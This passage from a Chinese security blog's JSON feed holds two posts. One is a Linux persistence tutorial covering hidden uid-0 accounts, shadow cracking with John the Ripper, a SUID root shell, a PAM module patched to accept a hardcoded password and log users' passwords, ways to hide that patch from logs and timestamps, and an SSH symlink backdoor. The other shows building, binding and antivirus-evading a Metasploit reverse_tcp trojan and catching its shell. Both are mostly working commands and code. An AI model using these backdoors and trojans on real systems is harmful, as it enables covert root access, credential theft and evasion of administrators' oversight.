data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png\" alt=\"image-20230426005048939\" /> 已禁止 uid=0 用户远程登陆</p>\n<p>管理员可以<strong>禁止 root 用户</strong>通过<strong> ssh</strong> 的方式，远程登录服务器。</p>\n<p><strong>禁止方法</strong>如下：<br />\n（首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）<br />\n <code>vim /etc/ssh/sshd_config</code>  打开 sshd_config 文件<br />\n找到  <code>PermitRootLogin</code> ，改为 no<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png\" alt=\"image-20230426005055500\" /> 然后重启 ssh 服务<br />\n此时再通过 xshell 远程登录 root 账户，就会被拒绝：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png\" alt=\"image-20230426005101801\" /></p>\n<p>如果遇到了禁用 uid=0 账户远程登录的情况，也可以增加一个<strong>普通用户</strong>：<br />\n <code>echo &quot;用户名:x:1000:1000::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code> <br />\n 道理都是一样的，可以观察到，我们使用的普通用户的 ID 就是 1000</p>\n<h3 id=\"无交互情况下添加账户\"><a class=\"anchor\" href=\"#无交互情况下添加账户\">#</a> 无交互情况下添加账户</h3>\n<p>所利用漏洞的不一样，会导致攻击者可能面临无法交互、没有回显的情况，<br />\n在这种情况下，使用前两种方法是困难的，先给出如下的方法：</p>\n<p>命令 <code>useradd 用户名 -u 0 -o -g root -G root</code>  以及 <code>echo &quot;密码&quot; | passwd --stdin 用户名</code> ，<br />\n若服务器基于<strong> Debian</strong>，即不能使用 --stdin 操作的话，第二条改用命令 <code>echo 用户名:密码 | chpasswd</code> ，或者粗暴地直接用 \\n 回车（因为 passwd 是需要<strong>输入两次</strong>密码的）： <code>echo &quot;密码\\n密码&quot; | passwd 用户名</code></p>\n<ul>\n<li>第一个命令：使用 useradd 命令增加用户，-u 设置用户 id 为 0（root 用户），-g-G 设置新用户所在群组及附加群组为 root。如果禁止 root 远程登录，更改对应的参数就行。</li>\n<li>第二个命令：添加密码（linux 中新创建的用户是被锁定的，需使用 passwd 命令设置密码，才能投入使用）</li>\n</ul>\n<h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<p>但是这种增加用户账号的方法，会很轻易地被管理员发现</p>\n<h2 id=\"破解用户密码\"><a class=\"anchor\" href=\"#破解用户密码\">#</a> 破解用户密码</h2>\n<p>如果我们获得了某些用户的密码，那下次自然就可以直接登录了。</p>\n<p>linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许<strong>所有用户读取</strong>，所以若是用户密码也存放在 passwd 中，将导致用户密码<strong>泄露</strong>。<br />\n因此 Linux 将密码信息<strong>单独存放</strong>到 shadow 文件中。shadow <strong>只有 root 用户</strong>拥有读权限，其他用户<strong>没有任何权限</strong>，从而保证用户密码的安全性。</p>\n<p>但是，如果获得 shadow 文件 **（/etc/shadow）**，你会看到里面的密码是这样的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png\" alt=\"image-20230426005115328\" /> 当然是密码的 hash 值，不会让你直接看到的密码的明文</p>\n<p>但是，对于那些薄弱的密码，我们可以通过 <strong>John the Ripper</strong> 弱口令扫描工具（Kali 自带）进行破解。使用方法如下</p>\n<ol>\n<li>使用 unshadow 命令组合 passwd 和 shadow，获得 test： <code>unshadow /etc/passwd /etc/shadow &gt; test</code></li>\n<li>字典破解：使用自带的字典（usr/share/john/password.lst）：命令 <code>john test</code> <br />\n 使用自己的字典：命令 <code>john --wordlist=字典路径 test</code></li>\n</ol>\n<h2 id=\"放置suid-shell\"><a class=\"anchor\" href=\"#放置suid-shell\">#</a> 放置 SUID Shell</h2>\n<p>前提：getshell，已获得服务器的 root 权限</p>\n<p>SUID Shell 是一种<strong>能以 shell 拥有者权限运行</strong>的 shell，<br />\n这个后门其实就是更改了，拥有者为 root 的 shell 的属性（rwsr-xr-x）</p>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令</h3>\n<p>root 下执行命令：<br />\n <code>cp /bin/bash .shell</code> <br />\n <code>chmod u+s .shell</code> <br />\n 解释：</p>\n<ol>\n<li>复制 /bin/bash 为当前目录下名为 .shell 的文件，</li>\n<li>更改 .shell 文件权限，设置为 u+s 后，其他用户<strong>都享有文件拥有者的权限</strong>（而当前为 <strong>root</strong>，即享有 root 权限）</li>\n</ol>\n<p>下次如果从普通用户登录服务器，就能用命令： <code>/.shell</code>  ，运行这个 shell，从而获得 <strong>root</strong> 权限。<br />\n但是，bash2 针对 SUID Shell 做了一些<strong>护卫措施</strong>，所以如果使用上述命令运行 .shell ，只能当你在<strong>本地</strong>下（非远程连接）才能让 shell 的权限升为 root ，若是在远程运行，则还是原来的权限不变。</p>\n<p>对于这种情况，需要使用这个命令运行： <code>/.shell -p</code> ，这样在远程下也能获得 root 的 shell 了 &gt;</p>\n<h3 id=\"实现-2\"><a class=\"anchor\" href=\"#实现-2\">#</a> 实现</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png\" alt=\"image-20230426005121969\" /><br />\nwhoami 为 root</p>\n<h2 id=\"pam后门\"><a class=\"anchor\" href=\"#pam后门\">#</a> PAM 后门</h2>\n<h3 id=\"pam简介\"><a class=\"anchor\" href=\"#pam简介\">#</a> PAM 简介：</h3>\n<p>在 Linux 中执行某些程序时，执行前要先对启动它的用户进行认证，比如我们经常使用的 <strong>su</strong> 命令。<br />\n但是，实际工作时，我们常常得用<strong>不同的认证机制</strong>去认证不同程序的账号口令，这就会导致一个主机上有多个<strong>不同的认证系统</strong>，这显然是不合理的。<br />\n所以就有了<strong> PAM 机制</strong>。<strong>PAM</strong> 可以说是一套<strong> API</strong>，使管理员可以随意地选择程序的认证方式。<br />\nPAM 使用目录 **/etc/pam.d/<strong> 下的配置文件，即对应着不同的认证方式。程序调用目录下相应的配置文件，从而调用本地的认证模块（</strong>/lib/security/**）。</p>\n<h3 id=\"后门思路\"><a class=\"anchor\" href=\"#后门思路\">#</a> 后门思路：</h3>\n<p>我们<strong>登录</strong>的时候，也是用 PAM 模块来验证我们的密码是否正确的。<br />\n所以，我们可以从源码中找到<strong> PAM</strong> 的传统密码验证模块（pam_unix.so），<strong>修改 PAM 的验证逻辑</strong>，达成不去跟 shadow 里的密码校验，而是<strong>直接返回验证正确</strong>的效果，<br />\n然后编译出<strong>包含后门的 so 文件</strong>，替换原模块。</p>\n<h3 id=\"实现-3\"><a class=\"anchor\" href=\"#实现-3\">#</a> 实现：</h3>\n<ol>\n<li>直接使用脚本：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpdHNhbmQvc2hlbGwvYmxvYi9tYXN0ZXIvcGFtLnNo\">https://github.com/litsand/shell/blob/master/pam.sh</span></li>\n<li>手动更改</li>\n</ol>\n<h4 id=\"下载pam源码\"><a class=\"anchor\" href=\"#下载pam源码\">#</a> 下载 PAM 源码</h4>\n<p>首先确认 PAM 版本：</p>\n<ul>\n<li>Debian： <code>dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</code></li>\n<li>Centos： <code>rpm -qa|grep pam</code></li>\n</ul>\n<p>以我的 kali 为例，使用 <code>dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</code> ，得到输出：<strong>1.4.0-11</strong><br />\n 去 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5saW51eC1wYW0ub3JnL2xpYnJhcnkv\">http://www.linux-pam.org/library/</span> 或者 GitHub 发布稳定版的地址 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpbnV4LXBhbS9saW51eC1wYW0vcmVsZWFzZXMlRUYlQkMlOEMlRTQlQjglOEIlRTglQkQlQkQlRTUlODglQjAlRTglODclQUElRTUlQjclQjElRTclODklODglRTYlOUMlQUMlRTclOUElODQlRTYlQkElOTAlRTclQTAlODElRUYlQkMlOUE=\">https://github.com/linux-pam/linux-pam/releases，下载到自己版本的源码：</span><br />\n<strong>下载</strong>： <code> wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz</code> <br />\n<strong> 解压</strong>： <code>tar -xvf Linux-PAM-1.4.0.tar.xz</code></p>\n<h4 id=\"修改源码\"><a class=\"anchor\" href=\"#修改源码\">#</a> 修改源码</h4>\n<p><strong>效果 1：自定义密码添加：</strong></p>\n<p>修改解压目录下的 <code>/modules/pam_unix/pam_unix_auth.c</code>  文件：<br />\n第 173 行下加入： <code>if (strcmp(p,&quot;密码&quot;)==0) &#123;return PAM_SUCCESS;&#125;</code></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png\" alt=\"image-20230426005137550\" /></p>\n<p>很简单的代码：当输入的 p 和我们设定的 &quot;密码&quot; 相同的时候，返回直接验证成功。</p>\n<p><strong>编译：</strong></p>\n<p>确保有安装<strong> gcc 编译器</strong>和<strong> flex 库</strong>，<br />\n<strong>编译</strong>命令如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd Linux-PAM-1.4.0</span><br><span class=\"line\">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure><br />\n 未防止修改的 so 不正确，先找到原文件<strong>备份</strong>一个：</p>\n<p>命令 <code>find / -name &quot;pam_unix.so&quot;</code>   （找原文件地址）<br />\n我<strong>原文件</strong>的地址在：<strong>/usr/lib/x86_64-linux-gnu/security/pam_unix.so</strong><br />\n 编译出的<strong>新文件</strong>在：<strong>root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so</strong><br />\n <code>cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak</code> （备份在 /tmp/pam_unix.so.bak）<br />\n <code>cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so</code> （复制新 so 文件，覆盖原文件）</p>\n<p><strong>尝试用设定的密码登录：</strong></p>\n<p>（注意登录的需要是已有账户） <code>ssh 已有账户名@192.168.158.128</code> <br />\n 用自定义的 <strong>hello</strong> 密码，登录 root 成功：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png\" alt=\"image-20230426005144666\" /></p>\n<p><strong>不足 &amp; 优化：</strong></p>\n<ul>\n<li>若是管理员<strong>查看登录日志</strong>：<br />\n实时查看最后 10 条  <code>tail -f -n 10 /var/log/auth.log</code> （视具体情况不同，日志也有可能是 /var/log/secure）<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png\" alt=\"image-20230426005149260\" /><br />\n 第一条是从 ssh 输入<strong>正确密码</strong>登录的日志，第二条是输入<strong>自定义的密码</strong>登陆的日志，<br />\n可以看到，第二条会比第一条多出一行记录，<strong>报告验证失败</strong>，<br />\n这是因为，在我们添加语句的前一行，先使用了 <strong>_unix_verify_password</strong> 函数进行了验证：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png\" alt=\"image-20230426005201757\" /><br />\n 既然如此，我们可以找到函数 _unix_verify_password 的<strong>位置</strong>，在它验证之前，插入之前的那行代码，这样就能够<strong>避免验证密码报错</strong>。<br />\n更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png\" alt=\"image-20230426005205935\" /><br />\n 重新编译覆盖之后，ssh 远程登录，查看日志：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png\" alt=\"image-20230426005213331\" /><br />\n 可以看到，第三条就和第一条一样了。<br />\n&lt;br&gt;</li>\n<li>若是管理员查看<strong>文件修改的时间</strong>：<br />\n可以用 touch -r 命令修改新文件的时间：<br />\n <code>touch pam_unix.so -r /tmp/pam_unix.so.bak</code> （改为备份文件的时间）<br />\n修改前后用 <code>stat pam_unix.so*</code>  命令查看结果如下所示：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png\" alt=\"image-20230426005217672\" /><br />\n（仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)</li>\n</ul>\n<p>&lt;br&gt;<br />\n<strong> 效果 2：记录通过 ssh 登录的用户密码：</strong></p>\n<p>同样修改解压目录下的 <code>/modules/pam_unix/pam_unix_auth.c</code>  文件：<br />\n在第 173 行下加入，如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png\" alt=\"image-20230426005222756\" /><br />\n 每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中</p>\n<p>保存 -&gt; 编译 -&gt; 覆盖 -&gt; 从 ssh 用正常密码登录几次账号，提供记录的数据 -&gt; 查看保存的文件：<br />\n <code>cat /tmp/.record_pwd</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png\" alt=\"image-20230426005227686\" /></p>\n<h2 id=\"ssh软连接后门\"><a class=\"anchor\" href=\"#ssh软连接后门\">#</a> SSH 软连接后门</h2>\n<p><strong>前提</strong>：</p>\n<ul>\n<li>getshell，已获得服务器的 root 权限，</li>\n<li>ssh 配置中开启了 PAM 进行身份验证（验证 PAM 是否开启： <code>cat/etc/ssh/sshd_config|grep UsePAM</code> ）一般默认开启</li>\n<li>防火墙关闭，或者开放了使用的端口号</li>\n</ul>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理：</h3>\n<ul>\n<li>\n<p><strong>软连接简介：</strong><br />\n软链接，就是一个指向另一个档案位置的，特殊的档案。<br />\n软连接以路径的形式存在。类似于 Windows 操作系统中的<strong>快捷方式</strong>。</p>\n</li>\n<li>\n<p>若 ssh 配置中<strong>开启了 PAM 身份验证机制</strong>，PAM 模块会搜寻相关设定文件（一般在 **/etc/pam.d/<strong>）。<br />\n而在</strong> /etc/pam.d/su<strong> 文件中启用了</strong> pam_rootok.so** 模块。<br />\n该模块可以使 root 用户直接通过身份认证，<strong>不需要</strong>输入密码。</p>\n</li>\n<li>\n<p>当我们指定的端口的软链接文件为 <strong>/ 路径 /su</strong> 的时候，若从该端口<strong>连接 ssh</strong>，<strong>PAM</strong> 就会去路径 <code>/etc/pam.d/</code>  下找到对应的配置文件，即 **/etc/pam.d/su**，<br />\n然后使用 <strong>su</strong> 中启用的<strong> pam_rootok.so</strong> 模块，实现无密登录。</p>\n</li>\n</ul>\n<h3 id=\"创建root账户\"><a class=\"anchor\" href=\"#创建root账户\">#</a> 创建 root 账户</h3>\n<p>创建 ssh 软链接： <code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=端口号</code> （端口号确保可用）</p>\n<p>这条命令，先是使用 ln 强制 (-f) 创建，路径为 <code>/usr/sbin/sshd</code>  文件的软连接 (-s)，并保存为 <code>/usr/local/su</code>  文件（<strong>路径随意</strong>、<strong>文件名可变</strong>），然后把 su 文件（sshd）连到指定的端口</p>\n<p>其中，创建的软连接名字虽然可变，但是也<strong>不能随便命名</strong>。可用的名字可以通过命令： <code>find /etc/pam.d|xargs grep &quot;pam_rootok&quot;</code>  查看：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png\" alt=\"image-20230426005233857\" /></p>\n<h3 id=\"实现-4\"><a class=\"anchor\" href=\"#实现-4\">#</a> 实现：</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png\" alt=\"image-20230426005237555\" /></p>\n<p>这时候就能从 2333 端口，用 root 身份登入了（ <code>ssh root@192.168.158.128 -p 2333</code> ）：<br />\n这里使用 cmd 演示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png\" alt=\"\" /></p>\n<h3 id=\"创建其它账户\"><a class=\"anchor\" href=\"#创建其它账户\">#</a> 创建其它账户</h3>\n<p>PAM 中事先是没有供其他用户免密登录的配置文件的，所以，要事先使用下面的命令，用 echo 把引号内的内容保存到 <code>/etc/pam.d/用户名</code> 的文件里面，让以你的用户名为文件名的配置文件使用<strong> pam_rootok.so</strong> 模块。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot; </span><br><span class=\"line\"> #%PAM-1.0</span><br><span class=\"line\"> auth       sufficient   pam_rootok.so</span><br><span class=\"line\"> auth       include      system-auth</span><br><span class=\"line\"> account    include      system-auth</span><br><span class=\"line\"> password   include      system-auth</span><br><span class=\"line\"> session    include      system-auth &quot; &gt;&gt; /etc/pam.d/已有的用户名</span><br></pre></td></tr></table></figure><br />\n 现在可以看到，在 <code>/etc/pam.d/</code>  文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为<strong> kali</strong>）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png\" alt=\"image-20230426005247027\" /></p>\n<p>现在再执行 <code>find /etc/pam.d|xargs grep &quot;pam_rootok&quot;</code>  命令查找，可以看到，可用的名字已经多了一个<strong> kali</strong> 了：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png\" alt=\"image-20230426005254226\" /><br />\n 现在再使用命令： <code>ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号</code> 创建软链接，就能达到普通用户免密登陆的效果</p>\n<p><strong>实现：</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png\" alt=\"image-20230426005258790\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png\" alt=\"image-20230426005304178\" /></p>\n",
            "tags": [
                "Backdoor",
                "Linux",
                "Kali"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/",
            "title": "Metasploit 木马编译利用",
            "date_published": "2022-04-02T15:29:09.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>Metasploit</strong> 是一个开源的，可用来<strong>发现</strong>、<strong>验证</strong>并<strong>利用</strong>漏洞的渗透测试平台。</p>\n<p>Kali 中默认安装了 <strong>Metasploit</strong> 框架。</p>\n</div>\n<h2 id=\"msfvenom-命令实现木马生成-捆绑以及免杀处理\"><a class=\"anchor\" href=\"#msfvenom-命令实现木马生成-捆绑以及免杀处理\">#</a> msfvenom 命令实现木马生成、捆绑以及免杀处理</h2>\n<p><strong>简介：</strong></p>\n<p><strong>msfvenom</strong> 是 <strong>Metasploit</strong> 中的一个命令。</p>\n<p><strong>msfvenom</strong> 命令结合了 msfpayload 和 msfencoder 的功能，能够<strong>生成木马</strong>，并实现木马编码<strong>免杀</strong>和避免坏字符、捆绑木马等。</p>\n<h3 id=\"msfvenom-命令用法\"><a class=\"anchor\" href=\"#msfvenom-命令用法\">#</a> msfvenom 命令用法</h3>\n<p>涉及到的<strong>选项</strong>有：</p>\n<p><strong>-l</strong>：列出指定<strong>模块</strong>（包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all）的所有可用<strong>资源</strong>。其中 <strong>payloads</strong> 对应的就是<strong>木马</strong>。</p>\n<p><strong>-p</strong>：指定需要使用的 <strong>payload</strong> ，可以指定 ‘-’ 或者 stdin 来<strong>自定义</strong> payload。<br />\n如果不知道 payload 包括哪些选项，可以使用  <code>--list-options</code>  列出 payload 的标准选项。</p>\n<p><strong>-f</strong>：指定 payload 的<strong>输出格式</strong>，可以使用  <code>--list formats</code>  来列出可选的格式。</p>\n<p><strong>-o</strong>：指定输出的 payload 的<strong>保存路径</strong>，也可以采用<strong>重定向</strong>的方式来替代 - o 选项。</p>\n<p><strong>-x</strong>： 指定一个<strong>自定义</strong>的<strong>可执行文件</strong>作为模板。即，把木马<strong>捆绑</strong>到指定的可执行文件上。</p>\n<p><strong>-e</strong>：指定使用的<strong>编码器</strong>（）。</p>\n<p><strong>-i</strong>： 指定对 payload 编码的<strong>次数</strong></p>\n<h3 id=\"木马生成\"><a class=\"anchor\" href=\"#木马生成\">#</a> 木马生成</h3>\n<ol>\n<li>先使用  <code>msfvenom -l payloads</code>  命令，查看<strong>可用的木马</strong>。<br />\n因为可用的木马有<strong>很多</strong>，所以可以根据所需木马的特性、结合 <strong>grep</strong> 限定木马的种类 <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442146/Typera/2023/04/ebeb726eacc7fad3302b80554fb13af1.png\" alt=\"image-20230426010221520\" /><br />\n 以木马  <code>linux/x86/meterpreter/reverse_tcp</code> （反向连接) 作为样例，<br />\n&lt;br&gt;</li>\n<li>查看该木马<strong>需要设置的选项</strong>：<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</code> <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442254/Typera/2023/04/874f3751e4961c5140e9e30ca40f22e7.png\" alt=\"image-20230426010409894\" /></li>\n</ol>\n<p>&lt;br&gt;</p>\n<ol start=\"3\">\n<li>\n<p>查看可指定的<strong>输出格式</strong>：<br />\n <code>msfvenom --list formats</code> <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442270/Typera/2023/04/38ea1bb4d485262080541e030e6fc0a3.png\" alt=\"image-20230426010426398\" /><br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>参考上面得到的信息，构造<strong>生成木马</strong>的命令：<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf</code> <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442278/Typera/2023/04/09553b61c2c9d88fe78ede3ea742468a.png\" alt=\"image-20230426010433724\" /></p>\n</li>\n</ol>\n<p>其中，<strong>-p</strong> 选择生成的木马为：<strong>linux/x64/shell_bind_tcp</strong>；<br />\n<strong>RHOST</strong> 指定将要攻击的<strong>目标主机</strong>的<strong> IP</strong>；<br />\n<strong>LPORT</strong> 指定对应端口号（默认为 4444，故可以不写）；<br />\n<strong>-f</strong> 指定生成木马文件的文件<strong>类型</strong>为 <strong>elf</strong><br />\n<strong>-o</strong> 指定保存生成的木马文件的<strong>地址</strong>为：<strong>/root/payload.elf</strong></p>\n<h3 id=\"木马捆绑\"><a class=\"anchor\" href=\"#木马捆绑\">#</a> 木马捆绑</h3>\n<p>通常情况下，木马会和正常的文件<strong>捆绑</strong>在一起，方便木马进行<strong>感染</strong>和<strong>传播</strong>。</p>\n<p>所以，我们要事先准备好一个用于<strong>绑定</strong>的文件，这里选用的是  <code>/root/hello_world</code> （ <strong>gcc</strong> 编译的一个简单的 C 程）。</p>\n<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442285/Typera/2023/04/c7bc72a382ae694be589d6a5cb25a3de.png\" alt=\"image-20230426010440843\" /></p>\n<p>其中，<strong>-x</strong> 指定<strong>绑定</strong>的可执行文件为  <code>/root/hello_world</code> ，其余项与生成木马的指令一致。</p>\n<h3 id=\"木马免杀\"><a class=\"anchor\" href=\"#木马免杀\">#</a> 木马免杀</h3>\n<p>在杀毒软件泛滥的今天，不对木马文件进行免杀处理很难通过<strong>杀软的检查</strong>，所以需要对木马进行<strong>免杀</strong>处理。</p>\n<p>查看可用的编码器： <code>msfvenom -l encoders</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442290/Typera/2023/04/d9aa39a90db02fe251a93aff3dd31cb7.png\" alt=\"image-20230426010444808\" /></p>\n<p>选用<strong>免杀</strong>效果较好的 <strong>x86/shikata_ga_nai</strong> 编译器进行编码。<br />\n命令： <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442294/Typera/2023/04/9f32f881202e4a535bac4f5ce0f8c517.png\" alt=\"image-20230426010449517\" /></p>\n<p>其中，<strong>-e</strong> 指定编译器为 <strong>x86/shikata_ga_nai</strong>，<br />\n<strong>-i</strong> 指定编码的次数为 5 次。<br />\n编码 <strong>5</strong> 次的木马，基本可以<strong>躲避部分</strong>杀软的查杀，</p>\n<p>当然可以对木马进行<strong>更多次</strong>的编码，这样可以<strong>提高</strong>木马的<strong>免杀机率</strong>，但是需要注意：这也可能会导致木马<strong>不可使用</strong>。</p>\n<h2 id=\"msfconsole-木马利用\"><a class=\"anchor\" href=\"#msfconsole-木马利用\">#</a> msfconsole 木马利用</h2>\n<p>使用之前生成的木马文件： <strong>payload.elf</strong>。</p>\n<h3 id=\"攻击端\"><a class=\"anchor\" href=\"#攻击端\">#</a> 攻击端：</h3>\n<p>输入命令  <code>msfconsole</code>  打开 <strong>MSF 控制台</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442298/Typera/2023/04/2c2e815f13d049741cd9371ace771daa.png\" alt=\"image-20230426010454524\" /></p>\n<p>输入命令： <code>use exploit/multi/handler</code> ，选择 exploit 模块</p>\n<p>然后，可以输入命令  <code>show options</code>  查看<strong>设置的参数</strong>（查看还要设置哪些）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1704010005/Typera/2023/12/4a6d04ee3788a771e9fe642e64fa8104.png\" alt=\"trojan-horse10\" /></p>\n<p>命令  <code>set PAYLOAD linux/x86/meterpreter/reverse_tcp</code>  ，设置 <strong>PAYLOAD</strong><br />\n 命令  <code>set LHOST 192.168.158.132</code> ，设置 local host 的<strong> IP</strong></p>\n<p>命令  <code>run</code>  开始<strong>监听</strong>对应的端口，等待<strong>目标服务器</strong>执行<strong>木马</strong>后，就能获得 <strong>shell</strong>。<br />\n如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442304/Typera/2023/04/8b2780434593170f1b8173cf9fa13836.png\" alt=\"image-20230426010500036\" /></p>\n<h3 id=\"目标服务器\"><a class=\"anchor\" href=\"#目标服务器\">#</a> 目标服务器：</h3>\n<p>用各种方式将<strong>木马文件</strong>传到<strong>目标服务器</strong>上，</p>\n<p>命令  <code>chmod +x payload.elf</code>  更改文件执行权限</p>\n<p>执行 <strong>payload.elf</strong> 文件（<strong>顺序</strong>：要在攻击端开始监听之后执行）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442311/Typera/2023/04/80d816c18312f780f743c4b82696c43f.png\" alt=\"image-20230426010506608\" /></p>\n<p>整理一下：</p>\n<ul>\n<li>攻击端：</li>\n</ul>\n<ol>\n<li><code>msfconsole</code></li>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set PAYLOAD linux/x86/meterpreter/reverse_tcp</code> <br />\n4. <code> set LHOST 192.168.158.132</code></li>\n<li><code>run</code> ，开始监听</li>\n</ol>\n<ul>\n<li>目标服务器：</li>\n</ul>\n<ol>\n<li>下载木马文件</li>\n<li><code>chmod +x payload.elf</code></li>\n<li><code>./ payload.elf</code></li>\n</ol>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit"
            ]
        }
    ]
}